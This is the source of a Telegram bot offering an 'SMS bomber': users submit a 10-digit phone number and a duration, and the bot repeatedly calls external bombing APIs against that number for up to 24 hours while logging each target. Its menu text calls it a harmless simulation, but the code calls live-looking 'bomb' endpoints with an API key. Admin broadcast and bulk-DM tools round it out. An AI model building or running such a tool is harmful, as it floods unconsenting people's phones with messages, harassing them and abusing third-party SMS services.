import os
import asyncio
import json
import shutil
import sqlite3
import logging
import tempfile
from datetime import datetime, timedelta
from typing import Dict
import aiohttp

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes
)

import database as db

# ========== LOGGING ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== CONFIGURATION (from environment) ==========
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID", "8104850843"))
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", "-10036720099488"))
FORCED_CHANNELS = json.loads(os.environ.get("FORCED_CHANNELS", "[]"))
START_API = os.environ.get("START_API", "https://bomber.kingcc.qzz.io/bomb")
SINGLE_API = os.environ.get("SINGLE_API", "https://bomm.gauravcyber0.workers.dev/")
STOP_API = os.environ.get("STOP_API", "https://bomber.kingcc.qzz.io/stop")
API_KEY = os.environ.get("API_KEY", "urfaaan_omdivine")
INTERVAL_SECONDS = int(os.environ.get("INTERVAL_SECONDS", "30"))
MAX_DURATION_SECONDS = int(os.environ.get("MAX_DURATION_SECONDS", "86400"))
BRANDING = "\n\n⚡ Powered by NULL PROTOCOL"

# Conversation states
PHONE, DURATION = range(2)
ADMIN_BAN, ADMIN_UNBAN, ADMIN_DELETE, ADMIN_DM_USER, ADMIN_DM_MSG, ADMIN_BROADCAST, ADMIN_BULKDM = range(7)

# Active bombing sessions
active_bombs: Dict[int, asyncio.Task] = {}

# ========== HELPER FUNCTIONS ==========
def format_json_human(data):
    if not data:
        return "No data"
    if "error" in data:
        return f"❌ Error: {data['error']}"
    text = ""
    if "message" in data:
        text += f"📢 {data['message']}\n"
    if "status" in data:
        text += f"Status: {data['status']}\n"
    if "total_apis" in data:
        text += f"📊 Total APIs: {data['total_apis']}\n"
    if "success" in data:
        text += f"✅ Success: {data['success']}\n"
    if "failed" in data:
        text += f"❌ Failed: {data['failed']}\n"
    if "results" in data:
        text += "\n📡 Results:\n"
        for r in data["results"]:
            name = r.get("name", "Unknown")
            success = r.get("success", False)
            status = "✅" if success else "❌"
            text += f"{status} {name}"
            if "time" in r:
                text += f" ({r['time']})"
            text += "\n"
    if "final_stats" in data:
        stats = data["final_stats"]
        text += f"\n📊 Final Stats:\n"
        text += f"  Total requests: {stats.get('total_requests',0)}\n"
        text += f"  Success: {stats.get('success',0)}\n"
        text += f"  Failed: {stats.get('failed',0)}\n"
    return text.strip() or "No data"

async def call_start_api(phone):
    async with aiohttp.ClientSession() as session:
        url = f"{START_API}?key={API_KEY}&numbar={phone}"
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.json()
        except Exception as e:
            logger.exception("start_api error")
            return {"error": str(e)}

async def call_single_api(phone):
    async with aiohttp.ClientSession() as session:
        url = f"{SINGLE_API}?phone={phone}"
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.json()
        except Exception as e:
            logger.exception("single_api error")
            return {"error": str(e)}

async def call_stop_api(phone):
    async with aiohttp.ClientSession() as session:
        url = f"{STOP_API}?key={API_KEY}&numbar={phone}"
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.json()
        except Exception as e:
            logger.exception("stop_api error")
            return {"error": str(e)}

async def check_force_join(user_id, context):
    for channel in FORCED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(channel["id"], user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception as e:
            logger.exception(f"Force join check failed for channel {channel['id']}")
            return False
    return True

async def send_force_join_message(update, context):
    keyboard = [[InlineKeyboardButton(ch["name"], url=ch["link"])] for ch in FORCED_CHANNELS]
    keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
    await update.message.reply_text(
        "⚠️ *You must join the following channels to use this bot:*\n\n",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def start(update, context):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    if db.is_banned(user.id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    if not db.is_admin(user.id, OWNER_ID) and not await check_force_join(user.id, context):
        await send_force_join_message(update, context)
        return
    await show_main_menu(update, context)

async def show_main_menu(update, context, edit=False):
    keyboard = [
        [InlineKeyboardButton("💣 Bomber", callback_data="bomber")],
        [InlineKeyboardButton("ℹ️ Info", callback_data="info")],
        [InlineKeyboardButton("🆘 Help", callback_data="help")],
    ]
    if db.is_admin(update.effective_user.id, OWNER_ID):
        keyboard.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")])
    text = "🔫 *Main Menu*" + BRANDING
    if edit:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def info(update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔥 *Ultimate SMS Bomber (Simulation)*\n"
        "This bot demonstrates a fake bomber for entertainment.\n"
        "No real SMS are ever sent.\n"
        "Use 'Bomber' to start.\n\n"
        "⚠️ For educational/entertainment only." + BRANDING,
        parse_mode="Markdown"
    )

async def help_command(update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📖 *Help*\n"
        "1. Click 'Bomber' and enter a 10-digit phone number.\n"
        "2. Choose duration.\n"
        "3. Bot simulates bombing every 30 seconds until duration ends.\n"
        "4. Use 'Stop' button to cancel.\n\n"
        "Admin panel has all management tools." + BRANDING,
        parse_mode="Markdown"
    )

# ========== BOMBER CONVERSATION ==========
async def bomber_start(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if db.is_banned(user_id):
        await query.edit_message_text("🚫 You are banned.")
        return
    if user_id in active_bombs:
        await query.edit_message_text("⚠️ You already have an active bombing session. Use /stop first.")
        return
    await query.edit_message_text("📞 Send me the *10-digit phone number* (only digits).\nType /cancel to abort.",
                                  parse_mode="Markdown")
    return PHONE

async def get_phone(update, context):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid number. Please enter exactly 10 digits.")
        return PHONE
    context.user_data["phone"] = phone
    keyboard = [
        [InlineKeyboardButton("30 seconds", callback_data="dur_30"),
         InlineKeyboardButton("1 minute", callback_data="dur_60")],
        [InlineKeyboardButton("5 minutes", callback_data="dur_300"),
         InlineKeyboardButton("10 minutes", callback_data="dur_600")],
        [InlineKeyboardButton("30 minutes", callback_data="dur_1800"),
         InlineKeyboardButton("1 hour", callback_data="dur_3600")],
        [InlineKeyboardButton("2 hours", callback_data="dur_7200"),
         InlineKeyboardButton("Custom", callback_data="dur_custom")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    await update.message.reply_text(
        "⏱️ Choose duration:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return DURATION

async def duration_selected(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "cancel":
        await query.edit_message_text("❌ Cancelled.")
        return ConversationHandler.END
    if data == "dur_custom":
        await query.edit_message_text("Enter duration in seconds (e.g., 90 for 1.5 minutes):")
        return DURATION
    seconds = int(data.split("_")[1])
    context.user_data["duration_seconds"] = seconds
    await start_bombing(update, context, query)
    return ConversationHandler.END

async def custom_duration(update, context):
    text = update.message.text.strip()
    try:
        seconds = int(text)
        if seconds <= 0 or seconds > MAX_DURATION_SECONDS:
            raise ValueError
    except ValueError:
        await update.message.reply_text(f"❌ Invalid duration. Must be a number between 1 and {MAX_DURATION_SECONDS}.")
        return DURATION
    context.user_data["duration_seconds"] = seconds
    await start_bombing(update, context, None)
    return ConversationHandler.END

async def start_bombing(update, context, query=None):
    user_id = update.effective_user.id
    phone = context.user_data["phone"]
    duration_sec = context.user_data["duration_seconds"]
    if LOG_CHANNEL_ID:
        try:
            await context.bot.send_message(
                LOG_CHANNEL_ID,
                f"🔔 *New Bombing Request*\nUser: {user_id}\nTarget: +91{phone}\nDuration: {duration_sec} seconds\nTime: {datetime.now().isoformat()}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.exception("Failed to send log")
    start_result = await call_start_api(phone)
    start_text = format_json_human(start_result)
    msg = f"🔥 *Bombing Started!*\n\n{start_text}\n\nWill run for {duration_sec} seconds.\nUse /stop to cancel." + BRANDING
    if query:
        await query.edit_message_text(msg, parse_mode="Markdown")
    else:
        await update.message.reply_text(msg, parse_mode="Markdown")
    task = asyncio.create_task(bombing_loop(user_id, phone, duration_sec, context))
    active_bombs[user_id] = task

async def bombing_loop(user_id, phone, duration_sec, context):
    end_time = datetime.now() + timedelta(seconds=duration_sec)
    iteration = 0
    try:
        while datetime.now() < end_time:
            iteration += 1
            await asyncio.sleep(INTERVAL_SECONDS)
            if datetime.now() >= end_time:
                break
            result = await call_single_api(phone)
            text = f"📡 *Cycle #{iteration}*\n\n{format_json_human(result)}" + BRANDING
            try:
                await context.bot.send_message(user_id, text, parse_mode="Markdown")
            except Exception as e:
                logger.exception("Failed to send bombing update")
        stop_result = await call_stop_api(phone)
        await context.bot.send_message(
            user_id,
            f"🛑 *Bombing Stopped (duration ended)*\n\n{format_json_human(stop_result)}" + BRANDING,
            parse_mode="Markdown"
        )
    except asyncio.CancelledError:
        stop_result = await call_stop_api(phone)
        await context.bot.send_message(
            user_id,
            f"🛑 *Bombing Stopped by user*\n\n{format_json_human(stop_result)}" + BRANDING,
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.exception("Unexpected error in bombing loop")
        await context.bot.send_message(user_id, f"❌ An error occurred: {e}")
    finally:
        if user_id in active_bombs:
            del active_bombs[user_id]

async def stop(update, context):
    user_id = update.effective_user.id
    if user_id in active_bombs:
        active_bombs[user_id].cancel()
        await update.message.reply_text("🛑 Stopping bombing...")
    else:
        await update.message.reply_text("No active bombing session.")

# ========== ADMIN PANEL ==========
async def admin_panel(update, context):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if not db.is_admin(user_id, OWNER_ID):
        await query.edit_message_text("Unauthorized.")
        return
    keyboard = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
        [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
        [InlineKeyboardButton("🗑️ Delete User", callback_data="admin_delete")],
        [InlineKeyboardButton("💬 DM User", callback_data="admin_dm")],
        [InlineKeyboardButton("📨 Bulk DM", callback_data="admin_bulkdm")],
        [InlineKeyboardButton("💾 Backup DB", callback_data="admin_backup")],
    ]
    if user_id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("👑 Add Admin", callback_data="admin_addadmin"),
                         InlineKeyboardButton("👑 Remove Admin", callback_data="admin_removeadmin")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    await query.edit_message_text(
        "🔧 *Admin Panel*" + BRANDING,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def admin_action(update, context):
    query = update.callback_query
    data = query.data
    user_id = update.effective_user.id
    if not db.is_admin(user_id, OWNER_ID):
        await query.answer("Unauthorized.", show_alert=True)
        return

    if data == "admin_backup":
        await query.answer("Creating backup...")
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as tmp:
                shutil.copy2(db.DB_FILE, tmp.name)
                tmp_path = tmp.name
            with open(tmp_path, 'rb') as f:
                await context.bot.send_document(update.effective_chat.id, f, caption="📀 Database backup")
            os.unlink(tmp_path)
            await query.edit_message_text("Backup sent. Returning to admin panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_panel")]]))
        except Exception as e:
            logger.exception("Backup failed")
            await query.edit_message_text(f"Backup failed: {e}")
        return

    if data == "admin_addadmin" and user_id == OWNER_ID:
        context.user_data["admin_action"] = "addadmin"
        await query.edit_message_text("Send the user ID of the new admin:")
        return ADMIN_BAN
    if data == "admin_removeadmin" and user_id == OWNER_ID:
        context.user_data["admin_action"] = "removeadmin"
        await query.edit_message_text("Send the user ID of the admin to remove:")
        return ADMIN_BAN

    if data in ["admin_ban", "admin_unban", "admin_delete", "admin_dm"]:
        context.user_data["admin_action"] = data
        await query.edit_message_text("Send the user ID:")
        return ADMIN_BAN
    elif data == "admin_broadcast":
        context.user_data["admin_action"] = "broadcast"
        await query.edit_message_text("Send the message to broadcast (text only, or reply to a message with /broadcast for rich content).")
        return ADMIN_BROADCAST
    elif data == "admin_bulkdm":
        context.user_data["admin_action"] = "bulkdm"
        await query.edit_message_text("Send the message to bulk DM (text only, or reply to a message with /bulkdm for rich content).")
        return ADMIN_BULKDM
    else:
        await admin_panel(update, context)
        return ConversationHandler.END

async def admin_get_user_id(update, context):
    action = context.user_data.get("admin_action")
    try:
        target_id = int(update.message.text.strip())
    except:
        await update.message.reply_text("Invalid user ID. Please send a numeric ID.")
        return ADMIN_BAN

    if action == "admin_ban":
        db.ban_user(target_id)
        await update.message.reply_text(f"Banned user {target_id}.")
        await admin_panel_after_action(update, context)
        return ConversationHandler.END
    elif action == "admin_unban":
        db.unban_user(target_id)
        await update.message.reply_text(f"Unbanned user {target_id}.")
        await admin_panel_after_action(update, context)
        return ConversationHandler.END
    elif action == "admin_delete":
        db.delete_user(target_id)
        await update.message.reply_text(f"Deleted user {target_id} from database.")
        await admin_panel_after_action(update, context)
        return ConversationHandler.END
    elif action == "admin_dm":
        context.user_data["dm_target"] = target_id
        await update.message.reply_text("Now send the message to DM (you can reply to a message or type text):")
        return ADMIN_DM_MSG
    elif action == "addadmin" and update.effective_user.id == OWNER_ID:
        db.add_admin(target_id)
        await update.message.reply_text(f"Added admin {target_id}.")
        await admin_panel_after_action(update, context)
        return ConversationHandler.END
    elif action == "removeadmin" and update.effective_user.id == OWNER_ID:
        db.remove_admin(target_id)
        await update.message.reply_text(f"Removed admin {target_id}.")
        await admin_panel_after_action(update, context)
        return ConversationHandler.END
    else:
        await update.message.reply_text("Unknown action.")
        await admin_panel_after_action(update, context)
        return ConversationHandler.END

async def admin_get_dm_message(update, context):
    target = context.user_data.get("dm_target")
    try:
        if update.message.reply_to_message:
            await update.message.reply_to_message.copy(target)
        else:
            await context.bot.send_message(target, update.message.text)
        await update.message.reply_text(f"DM sent to {target}.")
    except Exception as e:
        logger.exception("DM failed")
        await update.message.reply_text(f"Failed to send DM: {e}")
    await admin_panel_after_action(update, context)
    return ConversationHandler.END

async def admin_broadcast_message(update, context):
    users = db.get_all_users()
    sent = 0
    msg = update.message
    try:
        for uid in users:
            try:
                if msg.reply_to_message:
                    await msg.reply_to_message.copy(uid)
                else:
                    await context.bot.send_message(uid, msg.text)
                sent += 1
                await asyncio.sleep(0.2)  # Rate limit protection
            except Exception as e:
                logger.warning(f"Broadcast failed to {uid}: {e}")
        await update.message.reply_text(f"Broadcast sent to {sent}/{len(users)} users.")
    except Exception as e:
        logger.exception("Broadcast error")
        await update.message.reply_text(f"Broadcast failed: {e}")
    await admin_panel_after_action(update, context)
    return ConversationHandler.END

async def admin_bulkdm_message(update, context):
    users = db.get_all_users()
    sent = 0
    msg = update.message
    try:
        for uid in users:
            try:
                if msg.reply_to_message:
                    await msg.reply_to_message.copy(uid)
                else:
                    await context.bot.send_message(uid, msg.text)
                sent += 1
                await asyncio.sleep(0.2)
            except Exception:
                pass
        await update.message.reply_text(f"Bulk DM sent to {sent}/{len(users)} users.")
    except Exception as e:
        logger.exception("Bulk DM error")
        await update.message.reply_text(f"Bulk DM failed: {e}")
    await admin_panel_after_action(update, context)
    return ConversationHandler.END

async def admin_panel_after_action(update, context):
    keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")]]
    await update.message.reply_text("Action completed.", reply_markup=InlineKeyboardMarkup(keyboard))

# ========== GENERAL CALLBACK HANDLER ==========
async def callback_handler(update, context):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if db.is_banned(user_id) and data not in ["check_join"]:
        await query.answer("You are banned.", show_alert=True)
        return

    if data == "check_join":
        if await check_force_join(user_id, context):
            await query.edit_message_text("✅ You have joined all channels! Click /start to continue.")
        else:
            await query.answer("You haven't joined all channels yet.", show_alert=True)
        return

    if data == "back_main":
        await show_main_menu(update, context, edit=True)
        return

    if data == "bomber":
        await bomber_start(update, context)
        return
    if data == "info":
        await info(update, context)
        return
    if data == "help":
        await help_command(update, context)
        return
    if data == "admin_panel":
        await admin_panel(update, context)
        return

# ========== HEALTH CHECK (for uptime robot) ==========
async def ping(update, context):
    await update.message.reply_text("ok")

# ========== SCHEDULED BACKUP ==========
async def scheduled_backup(context: ContextTypes.DEFAULT_TYPE):
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as tmp:
            shutil.copy2(db.DB_FILE, tmp.name)
            tmp_path = tmp.name
        with open(tmp_path, 'rb') as f:
            await context.bot.send_document(OWNER_ID, f, caption=f"📀 Daily backup {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        os.unlink(tmp_path)
    except Exception as e:
        logger.exception("Scheduled backup failed")
        await context.bot.send_message(OWNER_ID, f"Daily backup failed: {e}")

# ========== MAIN ==========
def main():
    db.init_db()
    app = Application.builder().token(TOKEN).build()

    # Bomber conversation
    bomber_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(bomber_start, pattern="^bomber$")],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            DURATION: [
                CallbackQueryHandler(duration_selected, pattern="^dur_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, custom_duration)
            ],
        },
        fallbacks=[CommandHandler("cancel", lambda u,c: u.message.reply_text("Cancelled."))],
        per_message=False
    )
    app.add_handler(bomber_conv)

    # Admin conversation
    admin_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_action, pattern="^admin_")],
        states={
            ADMIN_BAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_get_user_id)],
            ADMIN_DM_MSG: [MessageHandler(filters.ALL, admin_get_dm_message)],
            ADMIN_BROADCAST: [MessageHandler(filters.ALL, admin_broadcast_message)],
            ADMIN_BULKDM: [MessageHandler(filters.ALL, admin_bulkdm_message)],
        },
        fallbacks=[CommandHandler("cancel", lambda u,c: u.message.reply_text("Cancelled."))],
        per_message=False
    )
    app.add_handler(admin_conv)

    # Regular commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("ping", ping))  # health check

    # General callback handler
    app.add_handler(CallbackQueryHandler(callback_handler, pattern="^(?!admin_|bomber$|dur_|cancel$).*"))

    # Scheduled backup daily at 00:00 UTC
    if app.job_queue:
        app.job_queue.run_daily(scheduled_backup, time=datetime.strptime("00:00", "%H:%M").time(), days=1)
        logger.info("Scheduled backup enabled (daily at 00:00 UTC).")
    else:
        logger.warning("JobQueue not available. Scheduled backup disabled.")

    logger.info("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
